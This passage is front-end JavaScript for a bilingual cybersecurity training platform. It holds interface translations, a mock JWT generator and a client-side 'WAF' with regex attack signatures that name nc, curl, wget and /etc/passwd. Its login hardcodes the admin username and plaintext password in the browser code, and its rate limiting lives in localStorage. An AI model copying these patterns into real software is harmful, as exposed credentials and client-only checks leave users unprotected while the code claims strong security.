
/**
 * LFL // LOST FROM LIGHT CYBER DEFENSE ENGINE
     * Pure Vanilla JavaScript:
     *  - Official Kali Linux Dragon Geometric Intro Animation & Progress Engine
     *  - Multi-Tab Kali Web Terminal ("+" New Tab, Close Tab, History Per Tab)
     *  - 140+ Realistic Cyber Defense & Offensive CLI Commands (Nmap, Gobuster, FFuf, Hydra, Hping3, Bettercap, PowerShell, etc.)
     *  - 100% Turkish Native Interface
     *  - Admin-Only Visitor & Device Telemetry Logs Panel
     *  - Holographic 2D Canvas Threat Radar & Parallax Particles
     */

(function () {
    'use strict';

    // ==========================================
    // GLOBAL STATE
    // ==========================================
    const state = {
        theme: localStorage.getItem('lfl_theme') || localStorage.getItem('aegis_theme') || 'cyber-midnight',
        token: localStorage.getItem('cyber_token') || sessionStorage.getItem('cyber_token') || null,
        currentUser: null,
        activePage: 'page-dashboard',
        accessLogs: [],
        simRunning: false,
        language: localStorage.getItem('lfl_lang') || 'tr'
    };

    // ==========================================
    // MULTI-LANGUAGE (i18n) ENGINE (TR / EN)
    // ==========================================
    const I18N = {
        currentLang: localStorage.getItem('lfl_lang') || 'tr',
        translations: {
    "tr": {
        "btn_skip_intro": "GİRİŞİ ATLA [ESC] &rarr;",
        "nav_section_core": "TEMEL PLATFORM",
        "nav_section_academy": "AKADEMİ &amp; EĞİTİM",
        "nav_section_eval": "TEST &amp; DEĞERLENDİRME",
        "nav_section_guide": "REHBER &amp; SÖZLÜK",
        "nav_section_admin": "YÖNETİCİ &amp; DENETİM",
        "nav_dashboard": "Komuta Merkezi",
        "nav_cmd": "Komuta Merkezi",
        "crumb_root": "LFL Platform",
        "nav_academy": "Siber Akademi (Eğitim)",
        "nav_commands": "Siber Kod Kütüphanesi",
        "nav_terminal": "Kali Web Terminal",
        "nav_quiz": "Siber Rol Testi",
        "nav_ctf": "Siber CTF Arenası",
        "nav_glossary": "Siber Kılavuz &amp; Sözlük",
        "nav_logs": "Ziyaretçi &amp; Sistem Logları",
        "badge_education": "EĞİTİM",
        "badge_140_codes": "140+ KOD",
        "badge_10_questions": "10 SORU",
        "badge_6_levels": "10 SEVİYE",
        "cluster_active": "NODE CLUSTER // AKTİF",
        "cluster_sub": "ASP.NET Core &bull; EF SQLite &bull; HSTS",
        "topbar_search": "Siber Komutları ve Terimleri Ara... (Ctrl+K)",
        "topbar_search_title": "Siber Komutları ve Terimleri Ara (Ctrl+K)",
        "topbar_dragon": "🐉 Kali Animasyonu",
        "btn_signin": "Giriş",
        "hero_badge": "CYBER COMMAND MATRIX // ZERO-TRUST ACTIVE",
        "hero_sub": "Ofansif ve Defansif Siber Güvenlik Mimarisi • Canlı Operasyon Alanı",
        "btn_hero_quiz": "🎯 Siber Rol Testini Çöz (10 Soru)",
        "btn_hero_shield": "🛡️ Canlı Kalkan Testi",
        "tab_sqli": "SQLi Savunması",
        "tab_zerotrust": "Zero-Trust Kalkanı",
        "tab_xss": "XSS Filtresi",
        "tab_bruteforce": "Brute-Force Karantinası",
        "status_defcon": "DEFCON SEVİYESİ",
        "status_kernel": "KERNEL GÜVENLİK NOTU",
        "status_kestrel": "KESTREL SUNUCU İMZASI",
        "about_title": "Siber Güvenlikte Yeni Nesil Canlı Operasyon Sahası",
        "about_lead": "Lost From Light (LFL); ofansif (Red Team) ve defansif (Blue Team) siber güvenlik operasyonlarını, endüstri standardı zırhlama pratiklerini ve modern yazılım mühendisliğini tek çatı altında buluşturan interaktif bir siber savunma üssüdür.",
        "arch_title": "Endüstriyel Standartlarda Altyapı &amp; Savunma Mimarisi",
        "arch_subtitle": "LFL Platformunda sıfır taviz ilkesiyle uygulanan modern web, veri ve güvenlik mühendisliği katmanları. (Kartların üzerine gelerek 3D derinliği test edebilirsiniz)",
        "card1_tag": "BACKEND KERNEL",
        "card1_title": "C# .NET 8 &amp; ASP.NET Core",
        "card1_desc": "Asenkron request pipeline, yüksek verimli mikro-servis mimarisi ve gizlenmiş sunucu imzasıyla (Kestrel Banner Redaction) saldırgan keşiflerini felç eden güçlü sunucu altyapısı.",
        "card2_tag": "ORM &amp; SQLi KALKANI",
        "card2_title": "Entity Framework &amp; LINQ",
        "card2_desc": "Tüm veritabanı sorguları dinamik string birleştirme yerine kesin parametrik LINQ ifadeleriyle bağlanır. SQL Injection atak vektörleri baypas edilemez güvenli literal parametrelere dönüştürülür.",
        "card3_tag": "ZERO-TRUST MODELİ",
        "card3_title": "Zero-Trust &amp; RBAC İzolasyonu",
        "card3_desc": "\"Asla güvenme, her zaman doğrula\" kuralı. İç ağda bile her istek kimlik doğrulamasına ve mTLS şifrelemesine tabidir. Yetkisiz yatay geçiş (lateral movement) anında engellenir.",
        "card4_tag": "SEC-HEADERS HARDENING",
        "card4_title": "HSTS Preload &amp; Katı CSP",
        "card4_desc": "Strict-Transport-Security (1 yıllık Preload), X-Frame-Options: DENY (Clickjacking kalkanı), nosniff ve CSP Whitelist ile tarayıcı seviyesinde tam zırhlama.",
        "card5_tag": "TERMINAL ENGINE",
        "card5_title": "143+ Kali Komut Motoru",
        "card5_desc": "Nmap, Gobuster, Wireshark, Suricata, Hydra ve Mimikatz gibi endüstri standardı güvenlik araçlarını tarayıcıda sıfır gecikmeyle simüle eden yüksek etkileşimli Kali Web Terminali.",
        "card6_tag": "FRONTEND MİMARİSİ",
        "card6_title": "Vanilla JS &amp; Yerel Mimari",
        "card6_desc": "Ağır harici kütüphaneler olmadan geliştirilen hafif frontend; fetch() veya CORS engellerine takılmadan dosya çift tıklandığında bile anında bellekten çalışan sıfır bağımlılıklı yapı.",
        "tree_title": "Sıfırdan Başla ➔ Uzmanlaşma Patikası",
        "tree_subtitle": "Hiçbir ön bilgiye gerek yok. Kökten başla, temelleri kavra; ardından ilgi duyduğun alana (Red, Blue, Purple) doğru dallanarak uzmanlaş.",
        "tree_starter_btn": "🌱 Starter Patikasına Başla (18 Temel Oda)",
        "tree_red_btn": "🔴 Red Team Patikasına Gir",
        "tree_blue_btn": "🔵 Blue Team Patikasına Gir",
        "tree_purple_btn": "🟣 Purple Team Patikasına Gir",
        "tree_quiz_title": "Hangi patikadan başlaman gerektiğinden emin değil misin?",
        "tree_quiz_desc": "10 gerçekçi kurumsal senaryo sorusunu yanıtla; güçlü ve zayıf yönlerini analiz edip sana özel siber güvenlik rolünü belirleyelim.",
        "tree_quiz_btn": "Siber Rol Testini Başlat",
        "tree_root_badge": "SEVİYE 0 // SIFIRDAN BAŞLAYANLAR İÇİN KÖK PATİKA",
        "tree_root_title": "Starter Track // 18 Temel Eğitim ve Görev Odası",
        "tree_root_desc": "Ağ mimarisi, IP/MAC, Portlar, DNS, TCP/UDP, HTTP, Linux dosya sistemi, CLI, chmod izinleri, Nmap, Hashing, Prosesler (ps/kill), grep log analizi, ss portları, tcpdump paketleri, Cookie &amp; Session, SSH anahtarları ve UFW güvenlik duvarı. Sıfır bilgiyle gel, tam donanımla ayrıl.",
        "tree_red_badge": "🔴 OFANSİF OPERASYONLAR",
        "tree_red_title": "Red Team (Saldırı &amp; Pentest)",
        "tree_blue_badge": "🔵 DEFANSİF SAVUNMA",
        "tree_blue_title": "Blue Team (SOC &amp; Tehdit Avı)",
        "tree_purple_badge": "🟣 ENTEGRE STRATEJİ",
        "tree_purple_title": "Purple Team (Tatbikat &amp; Tehdit Modelleme)",
        "topbar_updates": "v4.2 Güncellemeleri",
        "nav_changelog": "Güncelleme Günlüğü",
        "changelog_title": "SİSTEM GÜNCELLEME GÜNLÜĞÜ",
        "changelog_subtitle": "LFL Platform mimarisine eklenen tüm yeni modüller, güvenlik katmanları, oda genişletmeleri ve komut motoru kayıtları.",
        "cl_stat_version": "Aktif Sürüm",
        "cl_stat_rooms": "Toplam Görev",
        "cl_stat_cli": "Terminal Motoru",
        "cl_stat_lang": "Dil Desteği",
        "cl_f_all": "Tümü",
        "cl_f_feat": "✨ Özellikler",
        "cl_f_sec": "🛡️ Güvenlik",
        "cl_f_acad": "🎓 Akademi",
        "cl_f_fix": "⚡ Düzeltmeler",
        "cl_search_placeholder": "Güncellemelerde ara...",
        "cl_btn_close": "Kapat [ESC]",
        "logs_badge": "GÜVENLİK AUDİT &amp; TELEMETRİ",
        "logs_main_heading": "Ziyaretçi &amp; İstemci Erişim Logları",
        "logs_main_subheading": "Sisteme bağlanan gerçek istemcilerin IP adresi, işletim sistemi, tarayıcısı ve cihaz parmak izi",
        "btn_export_logs": "Dışa Aktar",
        "btn_refresh_logs": "Yenile",
        "logs_stat_total": "TOPLAM ERİŞİM İSTEĞİ",
        "logs_stat_ips": "BENZERSİZ IP ADRESİ",
        "logs_stat_admins": "YÖNETİCİ ERİŞİMLERİ",
        "logs_stat_status": "SİSTEM LOG DURUMU",
        "logs_col_time": "Zaman",
        "logs_col_ip": "İstemci IP Adresi",
        "logs_col_os": "İşletim Sistemi",
        "logs_col_browser": "Tarayıcı &amp; Cihaz",
        "logs_col_user": "Kullanıcı / Rol",
        "logs_col_action": "İşlem &amp; Rota",
        "logs_col_status": "Durum",
        "auth_title_signin": "Operatör Kimlik Doğrulama",
        "auth_sub_signin": "Güvenli Erişim Ağ Geçidi &bull; JWT Bearer Token Yönetimi",
        "auth_tab_signin": "Giriş Yap",
        "auth_tab_signup": "Kayıt Ol",
        "form_username_label": "Operatör Adı / Callsign",
        "form_password_label": "Şifre / Güvenlik Anahtarı",
        "form_confirm_password_label": "Şifre Doğrulama (Tekrar)",
        "btn_auth_execute": "Giriş Yap &amp; Session Storage'a Kaydet &rarr;",
        "ctf_tier_badge": "KADEMELİ SİBER OPERASYON // 10 SEVİYE &bull; 6000 XP",
        "ctf_main_heading": "LFL Siber CTF Operasyon Sahası",
        "ctf_main_sub": "Keşif (Recon), Web Sızma, Adli Bilişim (Forensics), Active Directory, SOC C2 Avı, Konteyner Kaçışı ve Kernel Zero-Day operasyonlarını adım adım tamamlayın.",
        "ctf_btn_reset": "↺ Operasyonu Sıfırla",
        "ctf_hud_target_lbl": "AKTİF HEDEF SİSTEM",
        "ctf_hud_ops_lbl": "OPERASYON DURUMU",
        "ctf_hud_timer_lbl": "OPERASYON SÜRESİ",
        "ctf_hud_rank_lbl": "AKTİF SİBER RÜTBE",
        "ctf_flt_all": "🌐 Tüm Seviyeler (10)",
        "ctf_flt_recon": "🔍 Keşif &amp; Linux (1.1 - 1.2)",
        "ctf_flt_red": "🔴 Red Team &amp; Web/AD (2.1, 3.1, 3.2, 4.1)",
        "ctf_flt_blue": "🔵 Blue &amp; Purple Team (2.2, 4.2, 5.1)",
        "ctf_flt_boss": "👑 Grand Final Boss (5.2)",
        "ctf_btn_autostep": "⚡ Sıradaki Adımı Çalıştır",
        "ctf_btn_clear": "Temizle",
        "ctf_btn_restart": "Sıfırla",
        "ctf_term_footer_tip": "💡 İpucu: <kbd>Tab</kbd> ile otomatik tamamla, <kbd>&uarr;</kbd><kbd>&darr;</kbd> ile geçmişte gezin, sol görev listesinden <strong style=\"color: var(--cyan);\">⚡ Çalıştır</strong>'a bas veya bayrağı yakalayınca <code style=\"color: var(--green);\">submit LFL{...}</code> yaz.",
        "ctf_input_placeholder": "Kali komutunu yazın ve Enter'a basın (Tab: Otomatik Tamamla)..."
    },
    "en": {
        "btn_skip_intro": "SKIP INTRO [ESC] &rarr;",
        "nav_section_core": "CORE PLATFORM",
        "nav_section_academy": "ACADEMY &amp; TRAINING",
        "nav_section_eval": "TEST &amp; EVALUATION",
        "nav_section_guide": "GUIDE &amp; GLOSSARY",
        "nav_section_admin": "ADMIN &amp; AUDIT",
        "nav_dashboard": "Command Center",
        "nav_cmd": "Command Center",
        "crumb_root": "LFL Platform",
        "nav_academy": "Cyber Academy (Training)",
        "nav_commands": "Cyber Code Library",
        "nav_terminal": "Kali Web Terminal",
        "nav_quiz": "Cyber Role Quiz",
        "nav_ctf": "Cyber CTF Arena",
        "nav_glossary": "Cyber Guide &amp; Glossary",
        "nav_logs": "Visitor &amp; System Logs",
        "badge_education": "TRAINING",
        "badge_140_codes": "140+ CODES",
        "badge_10_questions": "10 QUESTIONS",
        "badge_6_levels": "10 LEVELS",
        "cluster_active": "NODE CLUSTER // ACTIVE",
        "cluster_sub": "ASP.NET Core &bull; EF SQLite &bull; HSTS",
        "topbar_search": "Search Cyber Commands &amp; Terms... (Ctrl+K)",
        "topbar_search_title": "Search Cyber Commands and Terms (Ctrl+K)",
        "topbar_dragon": "🐉 Kali Animation",
        "btn_signin": "Sign In",
        "hero_badge": "CYBER COMMAND MATRIX // ZERO-TRUST ACTIVE",
        "hero_sub": "Offensive & Defensive Cyber Security Architecture • Live Operations Range",
        "btn_hero_quiz": "🎯 Take Cyber Role Quiz (10 Questions)",
        "btn_hero_shield": "🛡️ Live Shield Test",
        "tab_sqli": "SQLi Defense",
        "tab_zerotrust": "Zero-Trust Shield",
        "tab_xss": "XSS Filter",
        "tab_bruteforce": "Brute-Force Quarantine",
        "status_defcon": "DEFCON LEVEL",
        "status_kernel": "DEFENSE KERNEL STATUS",
        "status_kestrel": "KESTREL SERVER SIGNATURE",
        "about_title": "Next-Gen Live Cyber Range &amp; Operations Field",
        "about_lead": "Lost From Light (LFL) is an interactive cyber defense command center unifying offensive (Red Team) and defensive (Blue Team) operations, industry-standard hardening practices, and modern software engineering under one roof.",
        "arch_title": "Industrial-Standard Infrastructure &amp; Defense Architecture",
        "arch_subtitle": "Modern web, data, and security engineering layers built with zero-compromise principles on LFL. (Hover over cards to test 3D tilt depth)",
        "card1_tag": "BACKEND KERNEL",
        "card1_title": "C# .NET 8 &amp; ASP.NET Core",
        "card1_desc": "High-performance async request pipeline, microservice architecture, and hidden server signature (Kestrel Banner Redaction) paralyzing attacker reconnaissance.",
        "card2_tag": "ORM &amp; SQLi SHIELD",
        "card2_title": "Entity Framework &amp; LINQ",
        "card2_desc": "All database queries use strictly parameterized LINQ expressions instead of dynamic concatenation, converting SQL Injection attack vectors into non-bypassable literal parameters.",
        "card3_tag": "ZERO-TRUST MODEL",
        "card3_title": "Zero-Trust &amp; RBAC Isolation",
        "card3_desc": "\"Never trust, always verify\" rule. Every internal request undergoes authentication and mTLS encryption; unauthorized lateral movement is instantly neutralized.",
        "card4_tag": "SEC-HEADERS HARDENING",
        "card4_title": "HSTS Preload &amp; Strict CSP",
        "card4_desc": "Full browser-level hardening with Strict-Transport-Security (1-year Preload), X-Frame-Options: DENY (Clickjacking shield), nosniff, and strict CSP Whitelist.",
        "card5_tag": "TERMINAL ENGINE",
        "card5_title": "143+ Kali Command Engine",
        "card5_desc": "High-interactivity Kali Web Terminal simulating industry-standard security tools like Nmap, Gobuster, Wireshark, Suricata, Hydra, and Mimikatz with zero latency in your browser.",
        "card6_tag": "FRONTEND ARCHITECTURE",
        "card6_title": "Vanilla JS &amp; Native Architecture",
        "card6_desc": "Lightweight frontend built without heavy external libraries; a zero-dependency architecture that runs instantly from memory even when double-clicking files without CORS restrictions.",
        "tree_title": "Start From Scratch ➔ Specialization Path",
        "tree_subtitle": "No prior knowledge needed. Start from the roots, grasp fundamentals, then branch out into your preferred field (Red, Blue, Purple).",
        "tree_starter_btn": "🌱 Start Starter Track (18 Core Rooms)",
        "tree_red_btn": "🔴 Enter Red Team Track",
        "tree_blue_btn": "🔵 Enter Blue Team Track",
        "tree_purple_btn": "🟣 Enter Purple Team Track",
        "tree_quiz_title": "Not sure which track you should start with?",
        "tree_quiz_desc": "Answer 10 realistic corporate scenario questions; let us analyze your strengths and weaknesses to determine your specialized cyber security role.",
        "tree_quiz_btn": "Start Cyber Role Quiz",
        "tree_root_badge": "LEVEL 0 // ROOT TRACK FOR ABSOLUTE BEGINNERS",
        "tree_root_title": "Starter Track // 18 Essential Training & Mission Rooms",
        "tree_root_desc": "Network architecture, IP/MAC, Ports, DNS, TCP/UDP, HTTP, Linux filesystem, CLI, chmod permissions, Nmap, Hashing, Processes (ps/kill), grep log analysis, ss ports, tcpdump packets, Cookie &amp; Session, SSH keys, and UFW firewall. Arrive with zero knowledge, leave fully empowered.",
        "tree_red_badge": "🔴 OFFENSIVE OPERATIONS",
        "tree_red_title": "Red Team (Offense &amp; Pentesting)",
        "tree_blue_badge": "🔵 DEFENSIVE OPERATIONS",
        "tree_blue_title": "Blue Team (SOC &amp; Threat Hunting)",
        "tree_purple_badge": "🟣 INTEGRATED STRATEGY",
        "tree_purple_title": "Purple Team (Simulation &amp; Threat Modeling)",
        "topbar_updates": "v4.2 Updates",
        "nav_changelog": "Changelog & Releases",
        "changelog_title": "SYSTEM CHANGELOG & RELEASES",
        "changelog_subtitle": "Comprehensive release history of all modules, security shields, academy expansions, and CLI engines.",
        "cl_stat_version": "Current Version",
        "cl_stat_rooms": "Total Rooms",
        "cl_stat_cli": "CLI Engine",
        "cl_stat_lang": "Language Support",
        "cl_f_all": "All",
        "cl_f_feat": "✨ Features",
        "cl_f_sec": "🛡️ Security",
        "cl_f_acad": "🎓 Academy",
        "cl_f_fix": "⚡ Fixes",
        "cl_search_placeholder": "Search updates...",
        "cl_btn_close": "Close [ESC]",
        "logs_badge": "SECURITY AUDIT &amp; TELEMETRY",
        "logs_main_heading": "Visitor &amp; Client Access Logs",
        "logs_main_subheading": "Real-time client IP addresses, operating systems, browsers, and device fingerprints connected to the system",
        "btn_export_logs": "Export",
        "btn_refresh_logs": "Refresh",
        "logs_stat_total": "TOTAL ACCESS REQUESTS",
        "logs_stat_ips": "UNIQUE IP ADDRESSES",
        "logs_stat_admins": "ADMIN ACCESSES",
        "logs_stat_status": "SYSTEM LOG STATUS",
        "logs_col_time": "Time",
        "logs_col_ip": "Client IP Address",
        "logs_col_os": "Operating System",
        "logs_col_browser": "Browser &amp; Device",
        "logs_col_user": "User / Role",
        "logs_col_action": "Action &amp; Route",
        "logs_col_status": "Status",
        "auth_title_signin": "Operator Authentication",
        "auth_sub_signin": "Secure Access Gateway &bull; JWT Bearer Token Management",
        "auth_tab_signin": "Sign In",
        "auth_tab_signup": "Sign Up",
        "form_username_label": "Operator Name / Callsign",
        "form_password_label": "Password / Security Key",
        "form_confirm_password_label": "Confirm Password (Repeat)",
        "btn_auth_execute": "Sign In &amp; Save to Session Storage &rarr;",
        "ctf_tier_badge": "TIERED CYBER OPERATIONS // 10 LEVELS &bull; 6000 XP",
        "ctf_main_heading": "LFL Cyber CTF Operations Range",
        "ctf_main_sub": "Complete Reconnaissance, Web Exploitation, Digital Forensics, Active Directory, SOC C2 Threat Hunting, Container Escape, and Kernel Zero-Day operations step by step.",
        "ctf_btn_reset": "↺ Reset Operation",
        "ctf_hud_target_lbl": "ACTIVE TARGET SYSTEM",
        "ctf_hud_ops_lbl": "OPERATION STATUS",
        "ctf_hud_timer_lbl": "OPERATION TIMER",
        "ctf_hud_rank_lbl": "ACTIVE CYBER RANK",
        "ctf_flt_all": "🌐 All Levels (10)",
        "ctf_flt_recon": "🔍 Recon &amp; Linux (1.1 - 1.2)",
        "ctf_flt_red": "🔴 Red Team &amp; Web/AD (2.1, 3.1, 3.2, 4.1)",
        "ctf_flt_blue": "🔵 Blue &amp; Purple Team (2.2, 4.2, 5.1)",
        "ctf_flt_boss": "👑 Grand Final Boss (5.2)",
        "ctf_btn_autostep": "⚡ Run Next Step",
        "ctf_btn_clear": "Clear",
        "ctf_btn_restart": "Reset",
        "ctf_term_footer_tip": "💡 Tip: Auto-complete with <kbd>Tab</kbd>, browse history with <kbd>&uarr;</kbd><kbd>&darr;</kbd>, click <strong style=\"color: var(--cyan);\">⚡ Run</strong> on mission steps, or type <code style=\"color: var(--green);\">submit LFL{...}</code>.",
        "ctf_input_placeholder": "Type Kali command and press Enter (Tab: Auto-Complete)..."
    }
},
        setLanguage(lang, notify = false) {
            if (lang !== 'tr' && lang !== 'en') lang = 'tr';
            this.currentLang = lang;
            state.language = lang;
            try { localStorage.setItem('lfl_lang', lang); } catch(e) {}
            document.documentElement.lang = lang;

            // Update topbar button visual
            const label = document.getElementById('current-lang-label');
            if (label) {
                // If current language is TR, button offers EN; if EN, button offers TR
                label.textContent = lang === 'tr' ? 'EN' : 'TR';
            }
            const btn = document.getElementById('btn-language-toggle');
            if (btn) {
                btn.title = lang === 'tr' ? 'Switch to English (EN)' : "Türkçe'ye Geç (TR)";
                btn.classList.toggle('active-en', lang === 'en');
            }

            // Apply all data-i18n elements
            const dict = this.translations[lang] || this.translations['tr'];
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.dataset.i18n;
                if (dict[key] !== undefined) {
                    el.innerHTML = dict[key];
                }
            });

            // Apply placeholders
            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
                const key = el.dataset.i18nPlaceholder;
                if (dict[key] !== undefined) {
                    el.placeholder = dict[key];
                }
            });

            // Apply titles/tooltips
            document.querySelectorAll('[data-i18n-title]').forEach(el => {
                const key = el.dataset.i18nTitle;
                if (dict[key] !== undefined) {
                    el.title = dict[key];
                }
            });

            // Update current active breadcrumb
            const crumbTitle = document.getElementById('current-crumb-title');
            if (crumbTitle && state.activePage) {
                const titles = lang === 'en' ? {
                    'page-dashboard': 'Command Center',
                    'page-academy': 'Cyber Academy',
                    'page-commands': 'Cyber Code Library',
                    'page-terminal': 'Kali Web Terminal',
                    'page-quiz': 'Cyber Role Quiz',
                    'page-glossary': 'Cyber Guide & Glossary',
                    'page-ctf': 'Cyber CTF Arena',
                    'page-logs': 'Visitor & System Logs'
                } : {
                    'page-dashboard': 'Komuta Merkezi',
                    'page-academy': 'Siber Akademi (Eğitim Planı)',
                    'page-commands': 'Siber Kod Kütüphanesi',
                    'page-terminal': 'Kali Web Terminal',
                    'page-quiz': 'Siber Rol Testi',
                    'page-glossary': 'Siber Kılavuz & Sözlük',
                    'page-ctf': 'Siber CTF Arenası',
                    'page-logs': 'Ziyaretçi & Sistem Logları'
                };
                crumbTitle.textContent = titles[state.activePage] || 'LFL Platform';
            }

            if (notify && typeof showToast === 'function') {
                showToast('info', lang === 'en' ? '🌐 Language: English' : '🌐 Dil: Türkçe', lang === 'en' ? 'Interface switched to English.' : 'Arayüz dili Türkçe olarak güncellendi.');
            }

            // Fire event for any listening components (e.g. Quiz)
            window.dispatchEvent(new CustomEvent('languageChanged', { detail: { lang } }));
        },
        lastToggleTime: 0,
        toggle() {
            const now = Date.now();
            if (now - this.lastToggleTime < 300) return;
            this.lastToggleTime = now;
            const targetLang = (this.currentLang === 'tr') ? 'en' : 'tr';
            this.setLanguage(targetLang, true);
        }
    };

    // Expose globally
    window.I18N = I18N;
    window.toggleLanguage = () => I18N.toggle();


    let generateTerminalResponse = null;




    // ==========================================
    // IN-BROWSER ZERO-BACKEND MOCK API CLIENT
    // 100% Client-Side Simulation - No C# Backend Required
    // ==========================================
    function generateMockJwt(username, role) {
        const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).replace(/=/g, '');
        const payload = btoa(JSON.stringify({
            sub: '1',
            uname: username,
            role: role,
            iat: Math.floor(Date.now() / 1000),
            exp: Math.floor(Date.now() / 1000) + 86400 * 30
        })).replace(/=/g, '');
        const signature = btoa('lfl_defense_simulated_hmac_sha256_sig').replace(/=/g, '');
        return `${header}.${payload}.${signature}`;
    }


    // ==========================================================================
    // LFL MILITARY-GRADE CYBER DEFENSE SHIELD (WAF, IDS, EDR, ANTI-BRUTEFORCE)
    // 100% Client-Side High-Sec Defense Engine & Threat Inspector
    // ==========================================================================
    const lflSecurityShield = (() => {
        // 1. Anti-Clickjacking / Frame-Buster Defense
        if (window.top !== window.self) {
            try {
                window.top.location = window.self.location;
            } catch (e) {
                document.documentElement.innerHTML = '<div style="background:#040711;color:#ef4444;height:100vh;display:flex;align-items:center;justify-content:center;font-family:monospace;font-size:18px;font-weight:bold;">[BLOCKED] CLICKJACKING_DETECTED: Yetkisiz çerçeveleme engellendi.</div>';
            }
        }

        // 2. Anti-Self-XSS Console Security Warning
        try {
            console.log(
                '%c[LFL ASKERİ SAVUNMA KALKANI AKTİF]%c\n' +
                'DİKKAT: Bu konsol sistem yöneticisi (burak_wyxz) denetimindedir.\n' +
                'Buraya yapıştıracağınız yabancı betikler oturumunuzun ele geçirilmesine yol açabilir.\n' +
                'Katman-7 WAF ve IDS tüm istemci isteklerini şifreli telemetriye kaydeder.',
                'background: #ef4444; color: #ffffff; font-weight: 800; font-size: 13px; padding: 4px 10px; border-radius: 4px;',
                'color: #00e5ff; font-family: monospace; font-size: 11px;'
            );
        } catch (e) { }

        // 3. Rate-Limiting & Anti-Brute-Force Shield
        const FAILED_LIMIT = 5;
        const LOCKOUT_MS = 60 * 1000; // 60s cooldown

        function getBruteForceState() {
            try {
                return JSON.parse(localStorage.getItem('lfl_waf_bruteforce') || '{}');
            } catch (e) {
                return {};
            }
        }

        function checkRateLimit() {
            const state = getBruteForceState();
            const now = Date.now();
            if (state.lockedUntil && state.lockedUntil > now) {
                const remainingSec = Math.ceil((state.lockedUntil - now) / 1000);
                return {
                    blocked: true,
                    remainingSec,
                    message: `🚨 ASKERİ SAVUNMA KİLİDİ: 5 başarısız deneme nedeniyle sistem ${remainingSec} saniye kilitlendi!`
                };
            }
            return { blocked: false };
        }

        function recordFailedAttempt(action = 'GİRİŞ') {
            const state = getBruteForceState();
            const now = Date.now();
            if (!state.attempts || (now - (state.firstAttemptTime || now) > LOCKOUT_MS)) {
                state.attempts = 1;
                state.firstAttemptTime = now;
            } else {
                state.attempts++;
            }

            if (state.attempts >= FAILED_LIMIT) {
                state.lockedUntil = now + LOCKOUT_MS;
                state.attempts = 0;
                logSecurityIncident('BRUTE_FORCE_LOCKOUT', `5 başarısız deneme sonrası ${action} 60sn süreyle donduruldu.`);
            }

            try {
                localStorage.setItem('lfl_waf_bruteforce', JSON.stringify(state));
            } catch (e) { }

            return state;
        }

        function resetFailedAttempts() {
            try {
                localStorage.removeItem('lfl_waf_bruteforce');
            } catch (e) { }
        }

        // 4. Katman-7 WAF (Web Application Firewall) Deep Payload Inspector
        const ATTACK_SIGNATURES = [
            { name: 'XSS_PAYLOAD', regex: /<script|javascript:|data:text\/html|onload\s*=|onerror\s*=|document\.cookie/i },
            { name: 'SQLI_PAYLOAD', regex: /('|")\s*or\s*('|")?\d+('|")?=('|")?\d+|union\s+select|drop\s+table|xp_cmdshell|--|;\s*drop/i },
            { name: 'PATH_TRAVERSAL', regex: /\.\.\/|\.\.\|\/etc\/passwd|c:\windows\system32/i },
            { name: 'CMD_INJECTION', regex: /;\s*(cat|ls|rm|nc|curl|wget)\s+|\|\s*nc\s+|\$\(whoami\)/i },
            { name: 'PROTOTYPE_POLLUTION', regex: /__proto__|constructor\s*\[\s*['"]prototype['"]\s*\]/i }
        ];

        function inspectPayload(inputString, context = 'GİRDİ') {
            if (!inputString || typeof inputString !== 'string') return { safe: true };

            for (const sig of ATTACK_SIGNATURES) {
                if (sig.regex.test(inputString)) {
                    logSecurityIncident(sig.name, `Tehdit engellendi: [${context}] -> ${inputString.substring(0, 45)}`);
                    return {
                        safe: false,
                        threat: sig.name,
                        message: `🚨 ASKERİ WAF BLOKAJI: Zararlı saldırı imzası (${sig.name}) tespit edildi ve düşürüldü!`
                    };
                }
            }
            return { safe: true };
        }

        // 5. Güvenlik Olayı Kaydedici (lfl_access_logs içine 403 ile ekler)
        function logSecurityIncident(threatType, details) {
            try {
                let logs = JSON.parse(localStorage.getItem('lfl_access_logs') || '[]');
                const incidentLog = {
                    id: Date.now() + Math.random().toString(36).substring(2, 6),
                    timestamp: new Date().toISOString(),
                    ipAddress: sessionStorage.getItem('lfl_cached_visitor_ip') || '127.0.0.1',
                    country: '🚨 Tehdit Algılandı',
                    operatingSystem: navigator.platform || 'Bilinmeyen İstemci',
                    browser: 'WAF Savunma Kalkanı',
                    deviceType: 'Saldırı Girişimi',
                    screen: `${window.screen.width}x${window.screen.height}`,
                    cores: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Çekirdek` : '4 Çekirdek',
                    connection: 'Zararlı İstek Engellendi',
                    language: navigator.language || 'tr-TR',
                    username: (state.currentUser && state.currentUser.username) ? state.currentUser.username : 'Bilinmeyen Saldırgan',
                    role: 'ATTACKER_BLOCKED',
                    method: 'WAF_INTERCEPT',
                    path: `[${threatType}] ${details}`,
                    statusCode: 403
                };
                logs.unshift(incidentLog);
                if (logs.length > 200) logs = logs.slice(0, 200);
                localStorage.setItem('lfl_access_logs', JSON.stringify(logs));
            } catch (e) { }
        }

        return {
            checkRateLimit,
            recordFailedAttempt,
            resetFailedAttempts,
            inspectPayload,
            logSecurityIncident
        };
    })();

    const api = {
        async login(username, password) {
            await new Promise(r => setTimeout(r, 100));
            const u = (username || '').trim();
            const p = (password || '');

            // 1. Askeri Savunma: Rate-Limit / Kaba Kuvvet Engelleme
            const rateLimit = lflSecurityShield.checkRateLimit();
            if (rateLimit.blocked) {
                return { ok: false, status: 429, data: { error: rateLimit.message } };
            }

            // 2. Askeri Savunma: Katman-7 WAF Payload Denetimi (XSS / SQLi / Injection)
            const uWaf = lflSecurityShield.inspectPayload(u, 'GİRİŞ_KULLANICI_ADI');
            if (!uWaf.safe) {
                lflSecurityShield.recordFailedAttempt('WAF_SALDIRI');
                return { ok: false, status: 403, data: { error: uWaf.message } };
            }
            const pWaf = lflSecurityShield.inspectPayload(p, 'GİRİŞ_PAROLA');
            if (!pWaf.safe) {
                lflSecurityShield.recordFailedAttempt('WAF_SALDIRI');
                return { ok: false, status: 403, data: { error: pWaf.message } };
            }

            // 3. TEK VE MUTLAK YETKİLİ ADMİN: burak_wyxz / bezmen132009
            if (u.toLowerCase() === 'burak_wyxz' && p === 'bezmen132009') {
                lflSecurityShield.resetFailedAttempts();
                const token = generateMockJwt('burak_wyxz', 'admin');
                const user = { id: 1, username: 'burak_wyxz', email: 'burak_wyxz@lostfromlight.local', role: 'admin' };
